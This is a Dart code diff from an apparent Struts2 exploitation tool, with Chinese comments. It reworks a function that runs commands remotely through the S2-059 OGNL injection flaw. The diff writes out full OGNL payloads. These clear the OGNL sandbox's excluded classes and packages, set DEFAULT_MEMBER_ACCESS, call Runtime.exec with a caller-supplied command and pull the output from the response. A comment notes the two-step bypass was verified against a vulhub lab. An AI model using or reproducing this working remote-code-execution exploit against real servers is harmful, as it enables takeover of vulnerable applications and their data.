@@ -530,34 +530,48 @@ class Struts2ExpService {
     }
   }
 
+  /// S2-059 沙箱是否已清理（容器级，进程内保持，清一次即可）。
+  bool _s2059SandboxCleared = false;
+
   // 执行命令 - S2-059
   // 注意：
-  //   1. new String[]{...} 数组字面量在 Struts2 2.5.16 沙箱中被拦截，必须用 exec(String) 形式
-  //   2. exec(String) 按空格拆分，不支持 shell 特殊字符（管道/重定向），仅支持简单命令
-  //   3. 输出从 <a id="..."> 属性中提取，readLine() 只返回第一行
+  //   1. Struts 2.5.16 的 OGNL 沙箱必须**分两步**：先清 excludedClasses /
+  //      excludedPackageNames（容器级、进程内保持），再在**同一请求内**
+  //      setMemberAccess 后 exec。把两步串成一个表达式在 vulhub 靶场上失败
+  //      （2026-11-18 实测：单请求返回空，两步稳定回显）。
+  //   2. exec(String) 按空格拆分，不支持管道/重定向，仅支持简单命令。
+  //   3. 输出取 <a id="..."> 属性值，readLine() 只返回第一行。
   Future<String?> execS2059(String cmd) async {
-    final uri = baseUri;
     try {
-      final bypass =
-          '(#vs=#attr["struts.valueStack"].context)'
-          '.(#container=#vs["com.opensymphony.xwork2.ActionContext.container"])'
-          '.(#ou=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))'
-          '.(#ou.setExcludedClasses(""))'
-          '.(#ou.setExcludedPackageNames(""))'
-          '.(#vs.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))';
-      final exec =
-          '.(#proc=@java.lang.Runtime@getRuntime().exec("${RceEncoder.escapeDoubleQuoted(cmd)}"))'
-          '.(new java.io.BufferedReader(new java.io.InputStreamReader(#proc.getInputStream())).readLine())';
-      final ognl = '%{$bypass$exec}';
+      if (!_s2059SandboxCleared) {
+        await http
+            .post(
+              baseUri,
+              body: <String, String>{
+                'id':
+                    "%{(#context=#attr['struts.valueStack'].context)"
+                    ".(#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
+                    ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
+                    ".(#ognlUtil.setExcludedClasses(''))"
+                    ".(#ognlUtil.setExcludedPackageNames(''))}",
+              },
+            )
+            .timeout(timeout);
+        _s2059SandboxCleared = true;
+      }
+
+      final escaped = RceEncoder.escapeDoubleQuoted(cmd);
+      final expr =
+          "%{(#context=#attr['struts.valueStack'].context)"
+          '.(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))'
+          '.(#a=@java.lang.Runtime@getRuntime().exec("$escaped"))'
+          '.(#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a.getInputStream())).readLine())}';
       final res = await http
-          .get(uri.replace(queryParameters: {'id': ognl}))
+          .post(baseUri, body: <String, String>{'id': expr})
           .timeout(timeout);
-      final match = RegExp(
-        r'<a id="(.*?)"',
-        dotAll: false,
-      ).firstMatch(res.body);
+      final match = RegExp(r'<a id="([^"]*)"').firstMatch(res.body);
       final out = match?.group(1)?.trim() ?? '';
-      return out.isNotEmpty ? out : null;
+      return out.isEmpty ? null : out;
     } catch (_) {
       return null;
     }
